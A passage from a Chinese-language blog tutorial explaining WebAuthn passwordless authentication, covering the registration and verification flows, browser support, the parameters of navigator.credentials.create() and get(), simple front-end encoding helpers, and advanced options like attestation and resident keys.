wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\n    publicKey: {\n        challenge,\n        rp: {\n            id,\n            name\n        },\n        user: {\n            id,\n            name,\n            displayName\n        },\n        pubKeyCredParams: [\n            {\n                type: \"public-key\",\n                alg\n            }\n        ],\n        authenticatorSelection: {\n            authenticatorAttachment,\n            userVerification\n        },\n        excludeCredentials: [\n            {\n                id,\n                transports: [],\n                type: \"public-key\"\n            }\n        ],\n        timeout\n    }\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\n    rawId: ArrayBuffer(32) {},\n    response: AuthenticatorAttestationResponse {\n        attestationObject: ArrayBuffer(390) {},\n        clientDataJSON: ArrayBuffer(121) {}\n    },\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\n    type: \"public-key\"\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\n    publicKey: {\n        challenge,\n        rpId,\n        userVerification,\n        allowCredentials: [\n            {\n                id,\n                transports: [],\n                type: \"public-key\"\n            }\n        ],\n        timeout\n    }\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\n    rawId: ArrayBuffer(32) {},\n    response: AuthenticatorAssertionResponse {\n        authenticatorData: ArrayBuffer(37) {},\n        signature: ArrayBuffer(256) {},\n        userHandle: ArrayBuffer(64) {},\n        clientDataJSON: ArrayBuffer(118) {}\n    }\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\n    type: \"public-key\"\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\n    challenge, // 自行设置\n    rp, // 自行设置\n    user, // 自行设置\n    pubKeyCredParams: [\n        {\n            type: \"public-key\",\n            alg: -7 // ES256\n        },\n        {\n            type: \"public-key\",\n            alg: -257 // RS256\n        }\n    ],\n    authenticatorSelection: {\n        userVerification: \"discouraged\",\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\n    },\n    excludeCredentials, // 自行设置\n    timeout: 60000\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\n    return window.btoa(String.fromCharCode(...a));\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\n    const publicKeyCredential = {\n        id: credentialInfo.id,\n        type: credentialInfo.type,\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\n        response: {\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\n        }\n    };\n    return publicKeyCredential;\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\n    // 可以发送了\n}).catch((error) =&gt; {\n    console.warn(error); // 捕获错误\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\n    publicKey: {\n        rp: {\n            icon\n        },\n        user: {\n            icon\n        },\n        attestation,\n        authenticatorSelection: {\n            requireResidentKey\n        },\n        extensions\n    }\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\n    uvm: true, // 要求认证器返回用户进行验证的方法\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\n    type: \"public-key\",\n    